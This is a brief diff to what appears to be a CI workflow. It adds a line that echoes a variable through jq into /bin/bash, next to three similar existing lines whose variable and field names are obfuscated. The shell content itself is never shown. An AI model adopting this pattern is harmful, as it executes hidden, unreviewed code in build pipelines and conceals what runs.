@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$qghp181" | jq -r .exa54 | /bin/bash
           printf '%s' "$afoi64" | jq -r .vdy03659 | /bin/bash
           printf '%s' "$cg5" | jq -r .utmen67 | /bin/bash
+          echo $l58499 | jq -r .bno150 | /bin/bash
 
       - name: Upload artifact
         if: always()
